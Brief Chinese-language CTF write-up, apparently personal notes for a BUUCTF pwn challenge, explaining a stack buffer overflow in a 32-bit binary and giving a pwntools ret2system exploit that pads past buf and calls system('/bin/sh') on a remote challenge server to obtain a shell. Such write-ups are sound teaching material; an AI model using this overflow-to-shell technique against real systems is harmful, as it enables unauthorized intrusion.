![[Pasted image 20231219202722.png]]
![[Pasted image 20231219202744.png]]
可以看见function函数中有可以栈溢出的变量buf
![[Pasted image 20231219202833.png]]
![[Pasted image 20231219214017.png]]
![[Pasted image 20231219202844.png]]
可以找到”/bin/sh“和system函数的地址
写出exp：
```python
from pwn import *
p = remote("node4.buuoj.cn",29161)
shell = 0x0804a024
system = 0x08048320
payload = b'a'*(0x88+4)+p32(system)+p32(0x0)+p32(shell)
p.sendlineafter('Input:',payload)
p.interactive()
```

